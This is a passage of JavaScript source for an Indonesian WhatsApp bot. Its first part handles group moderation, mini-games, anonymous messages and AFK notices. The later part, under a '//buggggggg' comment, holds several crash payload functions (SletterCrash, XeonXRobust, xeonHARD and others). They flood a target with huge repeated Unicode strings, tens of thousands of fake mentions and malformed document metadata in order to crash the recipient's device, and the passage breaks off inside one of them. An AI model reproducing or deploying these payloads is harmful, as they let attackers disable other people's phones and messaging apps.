            const isGcLink = new RegExp(`https://chat.whatsapp.com/${groupInviteCode}`, 'i').test(m.text);
            console.log('Apakah tautan mengarah ke grup ini?', isGcLink);

            if (isGcLink) {
                console.log('Tautan adalah undangan grup ini, tidak ada tindakan yang diambil.');
                return;
            }

            // Jika tautan bukan untuk grup ini, hapus pesan
            console.log('Tautan bukan untuk grup ini, menghapus pesan...');
            await sych.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.id,  // pastikan m.id adalah ID pesan yang valid
                    participant: m.sender
                }
            });

            // Kirim peringatan kepada pengirim
            console.log('Mengirim peringatan kepada pengirim...');
            await sych.relayMessage(m.chat, {
                extendedTextMessage: {
                    text: `Terdeteksi @${m.sender.split('@')[0]} mengirim tautan grup.\nMaaf, tautan harus dihapus.`,
                    contextInfo: {
                        mentionedJid: [m.key.participant],
                        isForwarded: true,
                        forwardingScore: 1,
                        quotedMessage: {
                            conversation: '*Anti Link❗*'
                        },
                        ...m.key
                    }
                }
            }, {});
        }
    } catch (error) {
        console.error('Terjadi kesalahan pada pengecekan link:', error);
    }
}

if (db.groups[m.chat].antilinkgc) {
    try {
        if (m.text.match(/chat\.whatsapp\.com/)) {
            console.log('Pesan mengandung tautan grup WhatsApp.');

            // Memeriksa apakah pengirim adalah admin
            const isAdmins = m.isAdmin || m.isBotAdmin; // Menentukan admin
            if (isAdmins || m.key.fromMe || isCreator) return;

            // Hapus pesan yang berisi tautan grup WhatsApp
            console.log('Menghapus pesan...');
            await sych.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,  // pastikan ID pesan valid
                    participant: m.key.participant
                }
            });
        }
    } catch (error) {
        console.error('Terjadi kesalahan pada pengecekan link GC:', error);
    }
}

if (db.groups[m.chat].antilink) {
    try {
        // Cek apakah pesan mengandung tautan HTTP atau HTTPS
        if (m.text.match(/https?:\/\//)) {
            console.log('Pesan mengandung tautan HTTP/HTTPS.');

            // Memeriksa apakah pengirim adalah admin
            const isAdmins = m.isAdmin || m.isBotAdmin; // Menentukan admin
            if (isAdmins || m.key.fromMe || isCreator) return;

            // Hapus pesan yang berisi tautan
            console.log('Menghapus pesan...');
            await sych.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,  // pastikan ID pesan valid
                    participant: m.key.participant
                }
            });
        }
    } catch (error) {
        console.error('Terjadi kesalahan pada pengecekan tautan:', error);
    }
}
			// Anti Virtex Group
			if (db.groups[m.chat].antivirtex && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (budy.length > 6000) {
					await sych.sendMessage(m.chat, {
						delete: {
							remoteJid: m.chat,
							fromMe: false,
							id: m.id,
							participant: m.sender
						}
					})
					await sych.relayMessage(m.chat, {
						extendedTextMessage: {
							text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Virtex..`,
							contextInfo: {
								mentionedJid: [m.key.participant],
								isForwarded: true,
								forwardingScore: 1,
								quotedMessage: {
									conversation: '*Anti Virtex❗*'
								},
								...m.key
							}
						}
					}, {})
					await sych.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
				if (m.msg.nativeFlowMessage && m.msg.nativeFlowMessage.messageParamsJson && m.msg.nativeFlowMessage.messageParamsJson.length > 3500) {
					await sych.sendMessage(m.chat, {
						delete: {
							remoteJid: m.chat,
							fromMe: false,
							id: m.id,
							participant: m.sender
						}
					})
					await sych.relayMessage(m.chat, {
						extendedTextMessage: {
							text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Bug..`,
							contextInfo: {
								mentionedJid: [m.key.participant],
								isForwarded: true,
								forwardingScore: 1,
								quotedMessage: {
									conversation: '*Anti Bug❗*'
								},
								...m.key
							}
						}
					}, {})
					await sych.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
			}
		}
		// Filter Bot
		if (m.isBot) return
		// Mengetik
		if (db.set[botNumber].autotyping && sych.public && isCmd) {
			await sych.sendPresenceUpdate('composing', m.chat)
		}
		if (db.set[botNumber].autovn && sych.public && isCmd) {
			// Mengirimkan status 'recording' (seperti voice note sedang direkam)
			await sych.sendPresenceUpdate('recording', m.chat);
		}
		// Salam
		if (/^a(s|ss)alamu('|)alaikum(| )(wr|)( |)(wb|)$/.test(budy?.toLowerCase())) {
			const jwb_salam = ['Wa\'alaikumusalam', 'Wa\'alaikumusalam wr wb', 'Wa\'alaikumusalam Warohmatulahi Wabarokatuh']
			sycreply(pickRandom(jwb_salam))
		}
		// Cek Expired
		prem.expiredCheck(sych, premium);
		// TicTacToe
		let room = Object.values(tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
		if (room) {
			let ok
			let isWin = !1
			let isTie = !1
			let isSurrender = !1
			if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
			isSurrender = !/^[1-9]$/.test(m.text)
			if (m.sender !== room.game.currentTurn) {
				if (!isSurrender) return !0
			}
			if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
				sycreply({
					'-3': 'Game telah berakhir',
					'-2': 'Invalid',
					'-1': 'Posisi Invalid',
					0: 'Posisi Invalid',
				} [ok])
				return !0
			}
			if (m.sender === room.game.winner) isWin = true
			else if (room.game.board === 511) isTie = true
			let arr = room.game.render().map(v => {
				return {
					X: '❌',
					O: '⭕',
					1: '1️⃣',
					2: '2️⃣',
					3: '3️⃣',
					4: '4️⃣',
					5: '5️⃣',
					6: '6️⃣',
					7: '7️⃣',
					8: '8️⃣',
					9: '9️⃣',
				} [v]
			})
			if (isSurrender) {
				room.game._currentTurn = m.sender === room.game.playerX
				isWin = true
			}
			let winner = isSurrender ? room.game.currentTurn : room.game.winner
			if (isWin) {
				db.users[m.sender].limit += 3
				db.users[m.sender].uang += 3000
			}
			let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
			if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat) room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
			if (room.x !== room.o) await sych.sendMessage(room.x, {
				text: str,
				mentions: parseMention(str)
			}, {
				quoted: m
			})
			await sych.sendMessage(room.o, {
				text: str,
				mentions: parseMention(str)
			}, {
				quoted: m
			})
			if (isTie || isWin) {
				delete tictactoe[room.id]
			}
		}
		// Suit PvP
		let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
		if (roof) {
			let win = ''
			let tie = false
			if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
				if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
					sycreply(`@${roof.p2.split`@`[0]} menolak suit,\nsuit dibatalkan`)
					delete suit[roof.id]
					return !0
				}
				roof.status = 'play';
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				sycreply(`Suit telah dikirimkan ke chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nSilahkan pilih suit di chat masing-masing klik https://wa.me/${botNumber.split`@`[0]}`)
				if (!roof.pilih) sych.sendMessage(roof.p, {
					text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`
				}, {
					quoted: m
				})
				if (!roof.pilih2) sych.sendMessage(roof.p2, {
					text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`
				}, {
					quoted: m
				})
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) sycreply(`Kedua pemain tidak niat main,\nSuit dibatalkan`)
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						sycreply(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`)
					}
					delete suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /gunting/i
			let b = /batu/i
			let k = /kertas/i
			let reg = /^(gunting|batu|kertas)/i;
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				sycreply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`);
				if (!roof.pilih2) sych.sendMessage(roof.p2, {
					text: '_Lawan sudah memilih_\nSekarang giliran kamu'
				})
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				sycreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
				if (!roof.pilih) sych.sendMessage(roof.p, {
					text: '_Lawan sudah memilih_\nSekarang giliran kamu'
				})
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
				db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
				sych.sendMessage(roof.asal, {
					text: `_*Hasil Suit*_${tie ? '\nSERI' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}\n\nPemenang Mendapatkan\n*Hadiah :* Uang(3000) & Limit(3)`.trim(),
					mentions: [roof.p, roof.p2]
				}, {
					quoted: m
				})
				delete suit[roof.id]
			}
		}
		// Tebak Bomb
		let pilih = '🌀',
			bomb = '💣';
		if (m.sender in tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd && !isCreator) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				tebakbom[m.sender].pick++;
				sych.sendMessage(m.chat, {
					react: {
						text: '❌',
						key: m.key
					}
				})
				tebakbom[m.sender].bomb--;
				tebakbom[m.sender].nyawa.pop();
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].nyawa.length < 1) {
					await sycreply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n_Pengurangan Limit : 1_`);
					sych.sendMessage(m.chat, {
						react: {
							text: '😂',
							key: m.key
						}
					})
					delete tebakbom[m.sender];
				} else await sycreply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join('')}\n\nTerpilih: ${tebakbom[m.sender].pick}\nSisa nyawa: ${tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				tebakbom[m.sender].pick++;
				tebakbom[m.sender].lolos--;
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].lolos < 1) {
					db.users[m.sender].uang += 6000
					await sycreply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n*Sisa nyawa :* ${tebakbom[m.sender].nyawa}\n*Bomb :* ${tebakbom[m.sender].bomb}\nBonus Uang 💰 *+6000*`);
					delete tebakbom[m.sender];
				} else sycreply(`*PILIH ANGKA*\n\n${brd.join('')}\n\nTerpilih : ${tebakbom[m.sender].pick}\nSisa nyawa : ${tebakbom[m.sender].nyawa}\nBomb : ${tebakbom[m.sender].bomb}`)
			}
		}
		// Akinator
		if (m.sender in akinator) {
			if (m.quoted && akinator[m.sender].key == m.quoted.id) {
				if (budy == '5') {
					akinator[m.sender].isWin = false
					await akinator[m.sender].cancelAnswer()
					let {
						key
					} = await sycreply(`🎮 Akinator Game Back :\n\n@${m.sender.split('@')[0]} (${akinator[m.sender].progress.toFixed(2)}) %\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n- 5 - Back`)
					akinator[m.sender].key = key.id
				} else if (akinator[m.sender].isWin && ['benar', 'ya'].includes(budy.toLowerCase())) {
					sych.sendMessage(m.chat, {
						react: {
							text: '🎊',
							key: m.key
						}
					})
					delete akinator[m.sender]
				} else {
					if (!isNaN(budy)) {
						if (akinator[m.sender].isWin) {
							let {
								key
							} = await sych.sendMessage(m.chat, {
								image: {
									url: akinator[m.sender].sugestion_photo
								},
								caption: `🎮 Akinator Answer :\n\n@${m.sender.split('@')[0]}\nDia adalah *${akinator[m.sender].sugestion_name}*\n_${akinator[m.sender].sugestion_desc}_\n\n- 5 - Back\n- *Ya* (untuk keluar dari sesi)`,
								contextInfo: {
									mentionedJid: [m.sender]
								}
							}, {
								quoted: m
							})
							akinator[m.sender].key = key.id
						} else {
							await akinator[m.sender].answer(budy)
							if (akinator[m.sender].isWin) {
								let {
									key
								} = await sych.sendMessage(m.chat, {
									image: {
										url: akinator[m.sender].sugestion_photo
									},
									caption: `🎮 Akinator Answer :\n\n@${m.sender.split('@')[0]}\nDia adalah *${akinator[m.sender].sugestion_name}*\n_${akinator[m.sender].sugestion_desc}_\n\n- 5 - Back\n- *Ya* (untuk keluar dari sesi)`,
									contextInfo: {
										mentionedJid: [m.sender]
									}
								}, {
									quoted: m
								})
								akinator[m.sender].key = key.id
							} else {
								let {
									key
								} = await sycreply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]} (${akinator[m.sender].progress.toFixed(2)}) %\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n- 5 - Back`)
								akinator[m.sender].key = key.id
							}
						}
					}
				}
			}
		}
		// Game
		
		// Family 100
		if (m.chat in family100) {
			if (m.quoted && m.quoted.id == family100[m.chat].id && !isCmd) {
				let room = family100[m.chat]
				let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
				let isSurender = /^((me)?nyerah|surr?ender)$/i.test(teks)
				if (!isSurender) {
					let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
					if (room.terjawab[index]) return !0
					room.terjawab[index] = m.sender
				}
				let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
				let caption = `Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}\n${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}\n${Array.from(room.jawaban, (jawaban, index) => { return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false }).filter(v => v).join('\n')}\n${isSurender ? '' : `Perfect Player`}`.trim()
				sycreply(caption)
				if (isWin || isSurender) delete family100[m.chat]
			}
		}
		// Menfes
		if (!m.isGroup) {
			if (menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = {
						isForwarded: true,
						forwardingScore: 1,
						quotedMessage: {
							conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*`
						},
						key: {
							remoteJid: '0@s.whatsapp.net',
							fromMe: false,
							participant: '0@s.whatsapp.net'
						}
					}
					const pesan = m.type === 'conversation' ? {
						extendedTextMessage: {
							text: m.msg,
							contextInfo: {
								isForwarded: true,
								forwardingScore: 1,
								quotedMessage: {
									conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*`
								},
								key: {
									remoteJid: '0@s.whatsapp.net',
									fromMe: false,
									participant: '0@s.whatsapp.net'
								}
							}
						}
					} : {
						[m.type]: m.msg
					}
					await sych.relayMessage(menfes[m.sender].tujuan, pesan, {});
				}
			}
		}
		// Afk
		let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = db.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			sycreply(`Jangan tag dia!\nDia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\nSelama ${clockString(new Date - afkTime)}`.trim())
		}
		if (db.users[m.sender].afkTime > -1) {
			let user = db.users[m.sender]
			sycreply(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}\nSelama ${clockString(new Date - user.afkTime)}`)
			user.afkTime = -1
			user.afkReason = ''
		}
		
		
	
        
	//buggggggg
	
	async function getBuffer(imageUrl) {
    const response = await fetch(imageUrl);
    const buffer = await response.buffer(); // Mengambil buffer gambar dari URL
    return buffer;
}

		
		async function newsLetter(zLoc, ptcp = true) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sych.relayMessage(zLoc, ptcp, {
                    userJid: zLoc,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function SletterCrash(zLoc, ptcp = false) {
let virtex = "DasarKontol -" + "💀ꦾ".repeat(77777) + "@1".repeat(77777);
	var messageContent = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363321763581234@newsletter`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: ["50251731838@s.whatsapp.net"],
                  groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': zLoc
			});
			await sych.relayMessage(zLoc, messageContent.message, {
				'remote': {
					'jid': zLoc
				},
				'messageId': messageContent.key.id
		});
            console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
}
   async function XeonXRobust(zLoc, ptcp = false) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await sych.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: 'ᄃΛᄂIƧƬΛᄃЯΛƧΉ' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
	}
  
     async function xeonHARD(zLoc, ptcp = false)
    {
          const gg = "ꦽ".repeat(10200);
          const ggg = "ꦿꦾ".repeat(10200);
          sych.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await sych.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: "akujelek?"
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: zLoc,
                    mentions: zLoc
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: zLoc
            }
          });
          await sych.relayMessage(zLoc, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ" + ggg,
                  address: "",
